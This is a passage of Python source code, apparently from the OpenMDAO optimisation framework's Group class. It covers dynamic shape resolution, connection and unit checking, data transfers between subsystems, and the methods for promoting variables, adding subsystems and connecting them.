nx.OrderedGraph()  # ordered graph for consistency across procs\n        dist_sz = {}  # local distrib sizes\n        knowns = set()  # variable nodes in the graph with known shapes\n        my_abs2meta_out = self._var_abs2meta['output']\n        my_abs2meta_in = self._var_abs2meta['input']\n\n        # find all variables that have an unknown shape (across all procs) and connect them\n        # to other unknown and known shape variables to form an undirected graph.\n        for io in ('input', 'output'):\n            for name, meta in self._var_allprocs_abs2meta[io].items():\n                if meta['shape_by_conn']:\n                    if name in conn:  # it's a connected input\n                        abs_from = conn[name]\n                        graph.add_edge(name, abs_from)\n                        if all_abs2meta_out[abs_from]['shape'] is not None:\n                            knowns.add(abs_from)\n                    else:\n                        if rev_conn is None:\n                            rev_conn = get_rev_conn()\n                        if name in rev_conn:  # connected output\n                            for inp in rev_conn[name]:\n                                graph.add_edge(name, inp)\n                                if all_abs2meta_in[inp]['shape'] is not None:\n                                    knowns.add(inp)\n                        elif not meta['copy_shape']:\n                            raise RuntimeError(f\"{self.msginfo}: 'shape_by_conn' was set for \"\n                                               f\"unconnected variable '{name}'.\")\n\n                if meta['copy_shape']:\n                    # variable whose shape is being copied must be on the same component, and\n                    # name stored in 'copy_shape' entry must be the relative name.\n                    abs_from = name.rsplit('.', 1)[0] + '.' + meta['copy_shape']\n                    if abs_from in all_abs2prom_in or abs_from in all_abs2prom_out:\n                        graph.add_edge(name, abs_from)\n                        # this is unlikely, but a user *could* do it, so we'll check\n                        a2m = all_abs2meta_in if abs_from in all_abs2meta_in else all_abs2meta_out\n                        if a2m[abs_from]['shape'] is not None:\n                            knowns.add(abs_from)\n                    else:\n                        raise RuntimeError(f\"{self.msginfo}: Can't copy shape of variable \"\n                                           f\"'{abs_from}'. Variable doesn't exist.\")\n\n                # store known distributed size info needed for computing shapes\n                if nprocs > 1:\n                    my_abs2meta = my_abs2meta_in if name in my_abs2meta_in else my_abs2meta_out\n                    if name in my_abs2meta:\n                        sz = my_abs2meta[name]['size']\n                        if sz is not None:\n                            dist_sz[name] = sz\n                    else:\n                        dist_sz[name] = 0\n\n        if graph.order() == 0:\n            # we don't have any shape_by_conn or copy_shape variables, so we're done\n            return\n\n        if nprocs > 1:\n            distrib_sizes = defaultdict(lambda: np.zeros(nprocs, dtype=INT_DTYPE))\n            for rank, dsz in enumerate(self.comm.allgather(dist_sz)):\n                for n, sz in dsz.items():\n                    distrib_sizes[n][rank] = sz\n        else:\n            distrib_sizes = {}\n\n        unresolved = set()\n        seen = knowns.copy()\n\n        for comps in nx.connected_components(graph):\n            comp_knowns = knowns.intersection(comps)\n            if not comp_knowns:\n                # we need at least 1 known node to resolve this component, so we fail.\n                # store the list of unresolved nodes so we have the total list at the end.\n                unresolved.update(comps)\n                continue\n\n            # because comps is a connected component, we only need 1 known node to resolve\n            # the rest\n            stack = [sorted(comp_knowns)[0]]  # sort to keep error messages consistent\n            while stack:\n                known = stack.pop()\n                known_a2m = all_abs2meta_in if known in all_abs2meta_in else all_abs2meta_out\n                known_shape = known_a2m[known]['shape']\n                known_dist = known_a2m[known]['distributed']\n                for node in graph.neighbors(known):\n                    if node in seen:\n                        a2m = all_abs2meta_in if node in all_abs2meta_in else all_abs2meta_out\n                        # check to see if shapes agree\n                        if a2m[node]['shape'] != known_shape:\n                            dist = a2m[node]['distributed']\n                            # can't compare shapes if one is dist and other is not. The mismatch\n                            # will be caught later in setup_connections in that case.\n                            if not (dist ^ known_dist):\n                                conditional_error(f\"{self.msginfo}: Shape mismatch,  \"\n                                                  f\"{a2m[node]['shape']} vs. \"\n                                                  f\"{known_shape} for variable '{node}' during \"\n                                                  \"dynamic shape determination.\")\n                    else:\n                        # transfer the known shape info to the unshaped variable\n                        copy_var_meta(known, node, distrib_sizes)\n                        seen.add(node)\n                        stack.append(node)\n\n        # save graph info for possible later plotting\n        self._shapes_graph = graph\n        self._shape_knowns = knowns\n\n        if unresolved:\n            unresolved = sorted(unresolved)\n            conditional_error(f\"{self.msginfo}: Failed to resolve shapes for {unresolved}. \"\n                              \"To see the dynamic shape dependency graph, \"\n                              \"do 'openmdao view_dyn_shapes <your_py_file>'.\")\n\n    @check_mpi_exceptions\n    def _setup_connections(self):\n        \"\"\"\n        Compute dict of all connections owned by this Group.\n\n        Also, check shapes of connected variables.\n        \"\"\"\n        # clean up promotion maps since we don't need them any more\n        self._promotes_src_indices = None\n\n        abs_in2out = self._conn_abs_in2out = {}\n        global_abs_in2out = self._conn_global_abs_in2out\n        pathname = self.pathname\n        allprocs_discrete_in = self._var_allprocs_discrete['input']\n        allprocs_discrete_out = self._var_allprocs_discrete['output']\n\n        for subsys in self._subsystems_myproc:\n            subsys._setup_connections()\n\n        path_dot = pathname + '.' if pathname else ''\n        path_len = len(path_dot)\n\n        allprocs_abs2meta_in = self._var_allprocs_abs2meta['input']\n        allprocs_abs2meta_out = self._var_allprocs_abs2meta['output']\n        abs2meta_in = self._var_abs2meta['input']\n        abs2meta_out = self._var_abs2meta['output']\n        sizes_out = self._var_sizes['nonlinear']['output']\n        out_idxs = self._var_allprocs_abs2idx['nonlinear']\n\n        nproc = self.comm.size\n\n        # Check input/output units here, and set _has_input_scaling\n        # to True for this Group if units are defined and different, or if\n        # ref or ref0 are defined for the output.\n        for abs_in, abs_out in global_abs_in2out.items():\n            if abs_in[:path_len] != path_dot or abs_out[:path_len] != path_dot:\n                continue\n\n            # Check that they are in different subsystems of this system.\n            out_subsys = abs_out[path_len:].split('.', 1)[0]\n            in_subsys = abs_in[path_len:].split('.', 1)[0]\n            if out_subsys != in_subsys:\n                if abs_in in allprocs_discrete_in:\n                    self._conn_discrete_in2out[abs_in] = abs_out\n                elif abs_out in allprocs_discrete_out:\n                    msg = f\"{self.msginfo}: Can't connect discrete output '{abs_out}' \" + \\\n                          f\"to continuous input '{abs_in}'.\"\n                    if self._raise_connection_errors:\n                        raise RuntimeError(msg)\n                    else:\n                        issue_warning(msg, category=SetupWarning)\n                else:\n                    abs_in2out[abs_in] = abs_out\n\n                if nproc > 1 and self._vector_class is None:\n                    # check for any cross-process data transfer.  If found, use\n                    # self._problem_meta['distributed_vector_class'] as our vector class.\n                    if (abs_in not in abs2meta_in or abs_out not in abs2meta_out or\n                            abs2meta_in[abs_in]['distributed'] or\n                            abs2meta_out[abs_out]['distributed']):\n                        self._vector_class = self._distributed_vector_class\n\n            # if connected output has scaling then we need input scaling\n            if not self._has_input_scaling and not (abs_in in allprocs_discrete_in or\n                                                    abs_out in allprocs_discrete_out):\n                out_units = allprocs_abs2meta_out[abs_out]['units']\n                in_units = allprocs_abs2meta_in[abs_in]['units']\n\n                # if units are defined and different, we need input scaling.\n                needs_input_scaling = (in_units and out_units and in_units != out_units)\n\n                # we also need it if a connected output has any scaling.\n                if not needs_input_scaling:\n                    out_meta = allprocs_abs2meta_out[abs_out]\n\n                    ref = out_meta['ref']\n                    if np.isscalar(ref):\n                        needs_input_scaling = ref != 1.0\n                    else:\n                        needs_input_scaling = np.any(ref != 1.0)\n\n                    if not needs_input_scaling:\n                        ref0 = out_meta['ref0']\n                        if np.isscalar(ref0):\n                            needs_input_scaling = ref0 != 0.0\n                        else:\n                            needs_input_scaling = np.any(ref0)\n\n                        if not needs_input_scaling:\n                            res_ref = out_meta['res_ref']\n                            if np.isscalar(res_ref):\n                                needs_input_scaling = res_ref != 1.0\n                            else:\n                                needs_input_scaling = np.any(res_ref != 1.0)\n\n                self._has_input_scaling = needs_input_scaling\n\n        # check compatability for any discrete connections\n        for abs_in, abs_out in self._conn_discrete_in2out.items():\n            in_type = self._var_allprocs_discrete['input'][abs_in]['type']\n            try:\n                out_type = self._var_allprocs_discrete['output'][abs_out]['type']\n            except KeyError:\n                msg = f\"{self.msginfo}: Can't connect continuous output '{abs_out}' \" + \\\n                      f\"to discrete input '{abs_in}'.\"\n                if self._raise_connection_errors:\n                    raise RuntimeError(msg)\n                else:\n                    issue_warning(msg, category=SetupWarning)\n            if not issubclass(in_type, out_type):\n                msg = f\"{self.msginfo}: Type '{out_type.__name__}' of output '{abs_out}' is \" + \\\n                      f\"incompatible with type '{in_type.__name__}' of input '{abs_in}'.\"\n                if self._raise_connection_errors:\n                    raise RuntimeError(msg)\n                else:\n                    issue_warning(msg, category=SetupWarning)\n\n        # check unit/shape compatibility, but only for connections that are\n        # either owned by (implicit) or declared by (explicit) this Group.\n        # This way, we don't repeat the error checking in multiple groups.\n\n        for abs_in, abs_out in abs_in2out.items():\n            all_meta_out = allprocs_abs2meta_out[abs_out]\n            all_meta_in = allprocs_abs2meta_in[abs_in]\n\n            # check unit compatibility\n            out_units = all_meta_out['units']\n            in_units = all_meta_in['units']\n\n            if out_units:\n                if not in_units:\n                    if not _is_unitless(out_units):\n                        msg = f\"Output '{abs_out}' with units of '{out_units}' \" + \\\n                            f\"is connected to input '{abs_in}' which has no units.\"\n                        issue_warning(msg, prefix=self.msginfo, category=UnitsWarning)\n                elif not is_compatible(in_units, out_units):\n                    msg = f\"{self.msginfo}: Output units of '{out_units}' for '{abs_out}' \" + \\\n                          f\"are incompatible with input units of '{in_units}' for '{abs_in}'.\"\n                    if self._raise_connection_errors:\n                        raise RuntimeError(msg)\n                    else:\n                        issue_warning(msg, category=SetupWarning)\n            elif in_units is not None:\n                if not _is_unitless(in_units):\n                    msg = f\"Input '{abs_in}' with units of '{in_units}' is \" + \\\n                        f\"connected to output '{abs_out}' which has no units.\"\n                    issue_warning(msg, prefix=self.msginfo, category=UnitsWarning)\n\n            fail = False\n\n            # check shape compatibility\n            if abs_in in abs2meta_in and abs_out in abs2meta_out:\n                meta_in = abs2meta_in[abs_in]\n\n                # get output shape from allprocs meta dict, since it may\n                # be distributed (we want global shape)\n                out_shape = all_meta_out['global_shape']\n\n                # get input shape and src_indices from the local meta dict\n                # (input is always local)\n                if meta_in['distributed']:\n                    in_full_shape = allprocs_abs2meta_in[abs_in]['global_shape']\n                else:\n                    in_full_shape = meta_in['shape']\n                in_shape = meta_in['shape']\n                src_indices = self._get_src_inds_array(abs_in)\n                flat = meta_in['flat_src_indices']\n                has_slice = meta_in['src_slice'] is not None\n\n                if src_indices is None and out_shape != in_full_shape:\n                    # out_shape != in_shape is allowed if\n                    # there's no ambiguity in storage order\n                    if not array_connection_compatible(in_shape, out_shape):\n                        msg = f\"{self.msginfo}: The source and target shapes do not match or \" + \\\n                              f\"are ambiguous for the connection '{abs_out}' to '{abs_in}'. \" + \\\n                              f\"The source shape is {tuple([int(s) for s in out_shape])} \" + \\\n                              f\"but the target shape is {tuple([int(s) for s in in_shape])}.\"\n                        if self._raise_connection_errors:\n                            raise ValueError(msg)\n                        else:\n                            issue_warning(msg, category=SetupWarning)\n                            fail = True\n\n                elif src_indices is not None:\n\n                    if shape_to_len(src_indices.shape) == 0:\n                        continue\n\n                    flat_array_slice_check = not (has_slice and\n                                                  src_indices.size == shape_to_len(in_shape))\n\n                    flat = meta_in['flat_src_indices']\n\n                    if flat_array_slice_check:\n                        # initial dimensions of indices shape must be same shape as target\n                        for idx_d, inp_d in zip(src_indices.shape, in_shape):\n                            if idx_d != inp_d:\n                                msg = f\"{self.msginfo}: The source indices \" + \\\n                                      f\"{src_indices} do not specify a \" + \\\n                                      f\"valid shape for the connection '{abs_out}' to \" + \\\n                                      f\"'{abs_in}'. The target shape is \" + \\\n                                      f\"{in_shape} but indices are {src_indices.shape}.\"\n                                if self._raise_connection_errors:\n                                    raise ValueError(msg)\n                                else:\n                                    issue_warning(msg, category=SetupWarning)\n                                    fail = True\n                                    continue\n\n                    # any remaining dimension of indices must match shape of source\n                    if len(src_indices.shape) > len(in_shape) and flat_array_slice_check:\n                        source_dimensions = src_indices.shape[len(in_shape)]\n                        if source_dimensions != len(out_shape):\n                            str_indices = str(src_indices).replace('\\n', '')\n                            msg = f\"{self.msginfo}: The source indices \" + \\\n                                  f\"{str_indices} do not specify a \" + \\\n                                  f\"valid shape for the connection '{abs_out}' to '{abs_in}'. \" + \\\n                                  f\"The source has {len(out_shape)} dimensions but the \" + \\\n                                  f\"indices expect {source_dimensions}.\"\n                            if self._raise_connection_errors:\n                                raise ValueError(msg)\n                            else:\n                                issue_warning(msg, category=SetupWarning)\n                                fail = True\n                                continue\n                    else:\n                        source_dimensions = 1\n\n                    # check all indices are in range of the source dimensions\n                    if flat or src_indices.ndim == 1:\n                        if allprocs_abs2meta_in[abs_in]['distributed']:\n                            out_size = np.sum(sizes_out[:, out_idxs[abs_out]])\n                        else:\n                            out_size = shape_to_len(out_shape)\n                        if src_indices.size > 0:\n                            mx = np.max(src_indices)\n                            mn = np.min(src_indices)\n                            if mx >= out_size:\n                                bad_idx = mx\n                            elif mn < -out_size:\n                                bad_idx = mn\n                            else:\n                                bad_idx = None\n                            if bad_idx is not None:\n                                msg = f\"{self.msginfo}: The source indices do not specify \" + \\\n                                      f\"a valid index for the connection '{abs_out}' to \" + \\\n                                      f\"'{abs_in}'. Index '{bad_idx}' is out of range for \" + \\\n                                      f\"source dimension of size {out_size}.\"\n                                if self._raise_connection_errors:\n                                    raise ValueError(msg)\n                                else:\n                                    issue_warning(msg, category=SetupWarning)\n                                    fail = True\n                        if src_indices.ndim > 1:\n                            meta_in['src_indices'] = src_indices.ravel()\n                        else:\n                            meta_in['src_indices'] = src_indices\n\n                        if src_indices.size != shape_to_len(in_shape) and flat_array_slice_check:\n                            msg = f\"{self.msginfo}: src_indices shape \" + \\\n                                  f\"{src_indices.shape} does not match {abs_in} shape \" + \\\n                                  f\"{in_shape}.\"\n                            if self._raise_connection_errors:\n                                raise ValueError(msg)\n                            else:\n                                issue_warning(msg, category=SetupWarning)\n                                fail = True\n                    else:\n                        for d in range(source_dimensions):\n                            if all_meta_out['distributed'] or all_meta_in['distributed']:\n                                d_size = out_shape[d] * self.comm.size\n                            else:\n                                d_size = out_shape[d]\n                            arr = src_indices[..., d]\n                            if np.any(arr >= d_size) or np.any(arr <= -d_size):\n                                for i in arr.flat:\n                                    size_check = abs(i) >= d_size\n                                    if size_check:\n                                        msg = f\"{self.msginfo}: The source indices \" + \\\n                                              f\"do not specify a valid index for the \" + \\\n                                              f\"connection '{abs_out}' to '{abs_in}'. \" + \\\n                                              f\"Index '{i}' is out of range for source \" + \\\n                                              f\"dimension of size {d_size}.\"\n                                        if self._raise_connection_errors:\n                                            raise ValueError(msg)\n                                        else:\n                                            issue_warning(msg, category=SetupWarning)\n                                            fail = True\n\n                        if not fail:\n                            # now convert src_indices into a flat array\n                            meta_in['src_indices'] = \\\n                                _flatten_src_indices(src_indices, in_shape,\n                                                     all_meta_out['global_shape'],\n                                                     all_meta_out['global_size'])\n\n            elif abs_in in abs2meta_in:\n                # Source is not local, but target is. We need to flatten the src_indices here too.\n                meta_in = abs2meta_in[abs_in]\n                src_indices = self._get_src_inds_array(abs_in)\n                if src_indices is not None:\n                    meta_in['src_indices'] = \\\n                        _flatten_src_indices(src_indices, meta_in['shape'],\n                                             all_meta_out['global_shape'],\n                                             all_meta_out['global_size'])\n\n    def _set_subsys_connection_errors(self, val=True):\n        \"\"\"\n        Set flag in all subgroups indicating whether connection errors just issue a Warning.\n\n        Parameters\n        ----------\n        val : bool\n            If True, connection errors will raise an Exception. If False, connection errors\n            will issue a warning and the offending connection will be ignored.\n        \"\"\"\n        for sub, _ in self._subsystems_allprocs.values():\n            if isinstance(sub, Group):\n                sub._raise_connection_errors = val\n                sub._set_subsys_connection_errors(val)\n\n    def _transfer(self, vec_name, mode, sub=None):\n        \"\"\"\n        Perform a vector transfer.\n\n        Parameters\n        ----------\n        vec_name : str\n            Name of the vector RHS on which to perform a transfer.\n        mode : str\n            Either 'fwd' or 'rev'\n        sub : None or str\n            If None, perform a full transfer.\n            If str, perform a partial transfer to named subsystem for linear Gauss--Seidel.\n        \"\"\"\n        xfer = self._transfers[vec_name][mode]\n        if sub in xfer:\n            xfer = xfer[sub]\n        else:\n            if mode == 'fwd' and self._conn_discrete_in2out and vec_name == 'nonlinear':\n                self._discrete_transfer(sub)\n            return\n\n        vec_inputs = self._vectors['input'][vec_name]\n\n        if mode == 'fwd':\n            if xfer is not None:\n                if self._has_input_scaling:\n                    vec_inputs.scale_to_norm()\n                    xfer._transfer(vec_inputs, self._vectors['output'][vec_name], mode)\n                    vec_inputs.scale_to_phys()\n                else:\n                    xfer._transfer(vec_inputs, self._vectors['output'][vec_name], mode)\n            if self._conn_discrete_in2out and vec_name == 'nonlinear':\n                self._discrete_transfer(sub)\n\n        else:  # rev\n            if xfer is not None:\n                if self._has_input_scaling:\n                    vec_inputs.scale_to_phys()\n                    xfer._transfer(vec_inputs, self._vectors['output'][vec_name], mode)\n                    vec_inputs.scale_to_norm()\n                else:\n                    xfer._transfer(vec_inputs, self._vectors['output'][vec_name], mode)\n\n    def _discrete_transfer(self, sub):\n        \"\"\"\n        Transfer discrete variables between components.  This only occurs in fwd mode.\n\n        Parameters\n        ----------\n        sub : None or str\n            If None, perform a full transfer.\n            If not, perform a partial transfer for linear Gauss--Seidel.\n        \"\"\"\n        comm = self.comm\n        key = None if sub is None else self._subsystems_allprocs[sub].system.name\n\n        if comm.size == 1:\n            for src_sys_name, src, tgt_sys_name, tgt in self._discrete_transfers[key]:\n                tgt_sys = self._subsystems_allprocs[tgt_sys_name].system\n                src_sys = self._subsystems_allprocs[src_sys_name].system\n                # note that we are not copying the discrete value here, so if the\n                # discrete value is some mutable object, for example not an int or str,\n                # the downstream system will have a reference to the same object\n                # as the source, allowing the downstream system to modify the value as\n                # seen by the source system.\n                tgt_sys._discrete_inputs[tgt] = src_sys._discrete_outputs[src]\n\n        else:  # MPI\n            allprocs_recv = self._allprocs_discrete_recv[key]\n            discrete_out = self._var_discrete['output']\n            if key in self._discrete_transfers:\n                xfers, remote_send = self._discrete_transfers[key]\n                if allprocs_recv:\n                    sendvars = [(n, discrete_out[n]['value']) for n in remote_send]\n                    allprocs_send = comm.gather(sendvars, root=0)\n                    if comm.rank == 0:\n                        allprocs_dict = {}\n                        for i in range(comm.size):\n                            allprocs_dict.update(allprocs_send[i])\n                        recvs = [{} for i in range(comm.size)]\n                        for rname, ranks in allprocs_recv.items():\n                            val = allprocs_dict[rname]\n                            for i in ranks:\n                                recvs[i][rname] = val\n                        data = comm.scatter(recvs, root=0)\n                    else:\n                        data = comm.scatter(None, root=0)\n                else:\n                    data = None\n\n                for src_sys_name, src, tgt_sys_name, tgt in xfers:\n                    tgt_sys, _ = self._subsystems_allprocs[tgt_sys_name]\n                    if tgt_sys._is_local:\n                        if tgt in tgt_sys._discrete_inputs:\n                            abs_src = '.'.join((src_sys_name, src))\n                            if data is not None and abs_src in data:\n                                src_val = data[abs_src]\n                            else:\n                                src_sys, _ = self._subsystems_allprocs[src_sys_name]\n                                src_val = src_sys._discrete_outputs[src]\n                            tgt_sys._discrete_inputs[tgt] = src_val\n\n    def _setup_transfers(self):\n        \"\"\"\n        Compute all transfers that are owned by this system.\n        \"\"\"\n        self._vector_class.TRANSFER._setup_transfers(self)\n        if self._conn_discrete_in2out:\n            self._vector_class.TRANSFER._setup_discrete_transfers(self)\n\n    def promotes(self, subsys_name, any=None, inputs=None, outputs=None,\n                 src_indices=None, flat_src_indices=None, src_shape=None):\n        \"\"\"\n        Promote a variable in the model tree.\n\n        Parameters\n        ----------\n        subsys_name : str\n            The name of the child subsystem whose inputs/outputs are being promoted.\n        any : Sequence of str or tuple\n            A Sequence of variable names (or tuples) to be promoted, regardless\n            of if they are inputs or outputs. This is equivalent to the items\n            passed via the `promotes=` argument to add_subsystem.  If given as a\n            tuple, we use the \"promote as\" standard of ('real name', 'promoted name')*[]:\n        inputs : Sequence of str or tuple\n            A Sequence of input names (or tuples) to be promoted. Tuples are\n            used for the \"promote as\" capability.\n        outputs : Sequence of str or tuple\n            A Sequence of output names (or tuples) to be promoted. Tuples are\n            used for the \"promote as\" capability.\n        src_indices : int or list of ints or tuple of ints or int ndarray or Iterable or None\n            This argument applies only to promoted inputs.\n            The global indices of the source variable to transfer data from.\n            A value of None implies this input depends on all entries of source.\n            Default is None. The shapes of the target and src_indices must match,\n            and form of the entries within is determined by the value of 'flat_src_indices'.\n        flat_src_indices : bool\n            This argument applies only to promoted inputs.\n            If True, each entry of src_indices is assumed to be an index into the\n            flattened source.  Otherwise each entry must be a tuple or list of size equal\n            to the number of dimensions of the source.\n        src_shape : int or tuple\n            Assumed shape of any connected source or higher level promoted input.\n        \"\"\"\n        if isinstance(any, str):\n            raise RuntimeError(f\"{self.msginfo}: Trying to promote any='{any}', \"\n                               \"but an iterator of strings and/or tuples is required.\")\n        if isinstance(inputs, str):\n            raise RuntimeError(f\"{self.msginfo}: Trying to promote inputs='{inputs}', \"\n                               \"but an iterator of strings and/or tuples is required.\")\n        if isinstance(outputs, str):\n            raise RuntimeError(f\"{self.msginfo}: Trying to promote outputs='{outputs}', \"\n                               \"but an iterator of strings and/or tuples is required.\")\n\n        src_shape = shape2tuple(src_shape)\n\n        if src_indices is None:\n            prominfo = None\n            if flat_src_indices is not None or src_shape is not None:\n                issue_warning(f\"ignored flat_src_indices and/or src_shape because\"\n                              \" src_indices was not specified.\", prefix=self.msginfo,\n                              category=UnusedOptionWarning)\n\n        else:\n            if outputs:\n                raise RuntimeError(f\"{self.msginfo}: Trying to promote outputs {outputs} while \"\n                                   f\"specifying src_indices {src_indices} is not meaningful.\")\n            elif isinstance(src_indices, np.ndarray):\n                if not np.issubdtype(src_indices.dtype, np.integer):\n                    raise TypeError(f\"{self.msginfo}: src_indices must contain integers, but \"\n                                    f\"src_indices for promotes from '{subsys_name}' are type \"\n                                    f\"{src_indices.dtype.type}.\")\n            elif not isinstance(src_indices, (int, list, tuple, slice, Iterable)):\n                raise TypeError(f\"{self.msginfo}: The src_indices argument should be an int, \"\n                                f\"list, tuple, ndarray, slice or Iterable, but src_indices for \"\n                                f\"promotes from '{subsys_name}' are {type(src_indices)}.\")\n\n            prominfo = _PromotesInfo(src_indices, flat_src_indices, src_shape)\n\n            if flat_src_indices and _is_slicer_op(src_indices):\n                promoted = inputs if inputs else any\n                issue_warning(f\"When promoting {promoted}, slice src_indices were \"\n                              \"specified, so flat_src_indices is ignored.\", prefix=self.msginfo,\n                              category=UnusedOptionWarning)\n\n        subsys = getattr(self, subsys_name)\n        if any:\n            subsys._var_promotes['any'].extend((a, prominfo) for a in any)\n        if inputs:\n            subsys._var_promotes['input'].extend((i, prominfo) for i in inputs)\n        if outputs:\n            subsys._var_promotes['output'].extend((o, None) for o in outputs)\n\n        # check for attempt to promote with different alias\n        list_comp = [i if isinstance(i, tuple) else (i, i)\n                     for i, _ in subsys._var_promotes['input']]\n\n        for original, new in list_comp:\n            for original_inside, new_inside in list_comp:\n                if original == original_inside and new != new_inside:\n                    raise RuntimeError(\"%s: Trying to promote '%s' when it has been aliased to \"\n                                       \"'%s'.\" % (self.msginfo, original_inside, new))\n\n        # if this was called during configure(), mark this group as modified\n        if self._problem_meta is not None:\n            if self._problem_meta['config_info'] is not None:\n                self._problem_meta['config_info']._prom_added(self.pathname, any=any,\n                                                              inputs=inputs, outputs=outputs)\n\n    def add_subsystem(self, name, subsys, promotes=None,\n                      promotes_inputs=None, promotes_outputs=None,\n                      min_procs=1, max_procs=None, proc_weight=1.0):\n        \"\"\"\n        Add a subsystem.\n\n        Parameters\n        ----------\n        name : str\n            Name of the subsystem being added\n        subsys : <System>\n            An instantiated, but not-yet-set up system object.\n        promotes : iter of (str or tuple), optional\n            A list of variable names specifying which subsystem variables\n            to 'promote' up to this group. If an entry is a tuple of the\n            form (old_name, new_name), this will rename the variable in\n            the parent group.\n        promotes_inputs : iter of (str or tuple), optional\n            A list of input variable names specifying which subsystem input\n            variables to 'promote' up to this group. If an entry is a tuple of\n            the form (old_name, new_name), this will rename the variable in\n            the parent group.\n        promotes_outputs : iter of (str or tuple), optional\n            A list of output variable names specifying which subsystem output\n            variables to 'promote' up to this group. If an entry is a tuple of\n            the form (old_name, new_name), this will rename the variable in\n            the parent group.\n        min_procs : int\n            Minimum number of MPI processes usable by the subsystem. Defaults to 1.\n        max_procs : int or None\n            Maximum number of MPI processes usable by the subsystem.  A value\n            of None (the default) indicates there is no maximum limit.\n        proc_weight : float\n            Weight given to the subsystem when allocating available MPI processes\n            to all subsystems.  Default is 1.0.\n\n        Returns\n        -------\n        <System>\n            the subsystem that was passed in. This is returned to\n            enable users to instantiate and add a subsystem at the\n            same time, and get the reference back.\n        \"\"\"\n        if self._setup_procs_finished:\n            raise RuntimeError(\"%s: Cannot call add_subsystem in \"\n                               \"the configure method\" % (self.msginfo))\n\n        if inspect.isclass(subsys):\n            raise TypeError(\"%s: Subsystem '%s' should be an instance, but a %s class object was \"\n                            \"found.\" % (self.msginfo, name, subsys.__name__))\n\n        if name in self._subsystems_allprocs or name in self._static_subsystems_allprocs:\n            raise RuntimeError(\"%s: Subsystem name '%s' is already used.\" % (self.msginfo, name))\n\n        if hasattr(self, name) and not isinstance(getattr(self, name), System):\n            # replacing a subsystem is ok (e.g. resetup) but no other attribute\n            raise RuntimeError(\"%s: Can't add subsystem '%s' because an attribute with that name \"\n                               \"already exits.\" % (self.msginfo, name))\n\n        match = namecheck_rgx.match(name)\n        if match is None or match.group() != name:\n            raise NameError(\"%s: '%s' is not a valid sub-system name.\" % (self.msginfo, name))\n\n        subsys.name = subsys.pathname = name\n\n        if isinstance(promotes, str) or \\\n           isinstance(promotes_inputs, str) or \\\n           isinstance(promotes_outputs, str):\n            raise RuntimeError(\"%s: promotes must be an iterator of strings and/or tuples.\"\n                               % self.msginfo)\n\n        prominfo = None\n\n        # Note, the declared order in any of these promotes arguments shouldn't matter. However,\n        # the order does matter when using system.promotes during configure. There, you are\n        # permitted to promote '*' then promote_to an alias afterwards, but not in the reverse.\n        # To make this work, we sort the promotes lists for this subsystem to put the wild card\n        # entries at the beginning.\n        if promotes:\n            subsys._var_promotes['any'] = [(p, prominfo) for p in\n                                           sorted(promotes, key=lambda x: '*' not in x)]\n        if promotes_inputs:\n            subsys._var_promotes['input'] = [(p, prominfo) for p in\n                                             sorted(promotes_inputs, key=lambda x: '*' not in x)]\n        if promotes_outputs:\n            subsys._var_promotes['output'] = [(p, prominfo) for p in\n                                              sorted(promotes_outputs, key=lambda x: '*' not in x)]\n\n        if self._static_mode:\n            subsystems_allprocs = self._static_subsystems_allprocs\n        else:\n            subsystems_allprocs = self._subsystems_allprocs\n\n        subsystems_allprocs[subsys.name] = _SysInfo(subsys, len(subsystems_allprocs))\n\n        if not isinstance(min_procs, int) or min_procs < 1:\n            raise TypeError(\"%s: min_procs must be an int > 0 but (%s) was given.\" %\n                            (self.msginfo, min_procs))\n        if max_procs is not None and (not isinstance(max_procs, int) or max_procs < min_procs):\n            raise TypeError(\"%s: max_procs must be None or an int >= min_procs but (%s) was given.\"\n                            % (self.msginfo, max_procs))\n        if isinstance(proc_weight, Number) and proc_weight < 0:\n            raise TypeError(\"%s: proc_weight must be a float > 0. but (%s) was given.\" %\n                            (self.msginfo, proc_weight))\n\n        self._proc_info[name] = (min_procs, max_procs, proc_weight)\n\n        setattr(self, name, subsys)\n\n        return subsys\n\n    def connect(self, src_name, tgt_name, src_indices=None, flat_src_indices=None):\n        \"\"\"\n        Connect source src_name to target tgt_name in this namespace.\n\n        Parameters\n        ----------\n        src_name : str\n            name of the source variable to connect\n        tgt_name : str or [str, ... ] or (str, ...)\n            name of the target variable(s) to connect\n        src_indices : int or list of ints or tuple of ints or int ndarray or Iterable or None\n            The global indices of the source variable to transfer data from.\n            The shapes of the target and src_indices must match, and form of the\n            entries within is determined by the value of 'flat_src_indices'.\n        flat_src_indices : bool\n            If True, each entry of src_indices is assumed to be an index into the\n            flattened source.  Otherwise it must be a tuple or list of size equal\n            to the number of dimensions of the source.\n        \"\"\"\n        # if src_indices argument is given, it should be valid\n        if isinstance(src_indices, str):\n            if isinstance(tgt_name, str):\n                tgt_name = [tgt_name]\n            tgt_name.append(src_indices)\n            raise TypeError(\"%s: src_indices must be an index array, did you mean\"\n                            \" connect('%s', %s)?\" % (self.msginfo, src_name, tgt_name))\n\n        # if multiple targets are given, recursively connect to each\n        if not isinstance(tgt_name, str) and isinstance(tgt_name, Iterable):\n            for name in tgt_name:\n                self.connect(src_name, name, src_indices, flat_src_indices=flat_src_indices)\n            return\n\n        if src_indices is not None and not _is_slicer_op(src_indices):\n            src_indices = np.atleast_1d(src_indices)\n            if not np.issubdtype(src_indices.dtype, np.integer):\n                raise TypeError(\"%s: src_indices must contain integers, but src_indices for \"\n                                \"connection from '%s' to '%s' is %s.\" %\n                                (self.msginfo, src_name, tgt_name, src_indices.dtype.type))\n            if src_indices.ndim == 1:\n                flat_src_indices = True\n\n        # target should not already be connected\n        for manual_connections in [self._manual_connections, self._static_manual_connections]:\n            if tgt_name in manual_connections:\n                srcname = manual_connections[tgt_name][0]\n                raise RuntimeError(\"%s: Input '%s' is already connected to '%s'.\" %\n                                   (self.msginfo, tgt_name, srcname))\n\n        # source and target should not be in the same system\n        if src_name.rsplit('.', 1)[0] == tgt_name.rsplit('.', 1)[0]:\n            raise RuntimeError(\"{}: Output and input are in the same System for \"\n                               \"connection from '{}' to '{}'.\".format(self.msginfo,\n                                                                      src_name, tgt_name))\n\n        if flat_src_indices and _is_slicer_op(src_indices):\n            issue_warning(f\"Connection from '{src_name}' to \"\n                          f\"'{tgt_name}' was added with slice src_indices, so \"\n                          \"flat_src_indices is ignored.\", prefix=self.msginfo,\n                          category=UnusedOptionWarning)\n\n        if self._static_mode:\n            manual_connections = self._static_manual_connections\n        else:\n            manual_connections = self._manual_connections\n\n        manual_connections[tgt_name] = (src_name, src_indices, flat_src_indices)\n\n    def set_order(self, new_order):\n        \"\"\"\n        Specify a new execution order for this system.\n\n        Parameters\n        ----------\n        new_order : list of str\n            List of system names in desired 